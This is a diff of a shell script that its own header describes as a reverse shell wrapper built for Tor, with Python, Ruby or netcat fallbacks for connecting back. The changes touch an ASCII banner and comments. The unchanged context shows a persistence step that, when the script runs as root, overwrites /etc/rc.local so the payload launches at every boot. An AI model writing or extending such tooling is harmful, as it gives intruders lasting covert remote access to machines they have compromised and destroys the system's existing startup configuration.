@@ -5,15 +5,15 @@
 ##### Reverse Shell Wrapper, Written with tor servers in mind. Multiple langs for shell.
 #### Python, ruby or nc for connect back.
 ## 
-#
-##
-##################################################################################
-#  ██████╗ ███╗   ██╗██╗ ██████╗ ███╗   ██╗███████╗██╗     ██╗ ██████╗███████╗  ##
-# ██╔═══██╗████╗  ██║██║██╔═══██╗████╗  ██║██╔════╝██║     ██║██╔════╝██╔════╝ ##
-# ██║   ██║██╔██╗ ██║██║██║   ██║██╔██╗ ██║███████╗██║     ██║██║     █████╗   #
-# ██║   ██║██║╚██╗██║██║██║   ██║██║╚██╗██║╚════██║██║     ██║██║     ██╔══╝   ##
-# ╚██████╔╝██║ ╚████║██║╚██████╔╝██║ ╚████║███████║███████╗██║╚██████╗███████╗  ##            
-##################################################################################
+# Version 1.2
+##                                                                                    
+                                                                                      \@/
+#  ██████╗ ███╗   ██╗██╗ ██████╗ ███╗   ██╗███████╗██╗     ██╗ ██████╗███████╗    ######### #
+# ██╔═══██╗████╗  ██║██║██╔═══██╗████╗  ██║██╔════╝██║     ██║██╔════╝██╔════╝   ##(@)###(@)##
+# ██║   ██║██╔██╗ ██║██║██║   ██║██╔██╗ ██║███████╗██║     ██║██║     █████╗     #####    ####
+# ██║   ██║██║╚██╗██║██║██║   ██║██║╚██╗██║╚════██║██║     ██║██║     ██╔══╝      #####  ####
+# ╚██████╔╝██║ ╚████║██║╚██████╔╝██║ ╚████║███████║███████╗██║╚██████╗███████╗##     #/\###  
+                                                                                       
 #
 ##
 ###
@@ -60,7 +60,7 @@ fi
 
 
 
-# check for python, if not python check for nc, if no nc check for ruby. if no ruby, bail.
+# check for python, if not python check for nc, if no nc check for ruby. if no ruby, if no perl... telnet?.
 
 
 if [ ! $(which python) == "" ];then
@@ -143,7 +143,7 @@ fi
 
 # Make persistent if possible
 if [[ $(whoami) == "root" ]];then
-    # Hey, its in the beta stage...
+    # Hey, its in the beta stage...should append itself rather than rewriting the file.
     echo "#!/bin/sh" > /etc/rc.local
     echo "/usr/local/sbin/$run" >> /etc/rc.local
     echo "exit0" >> /etc/rc.local
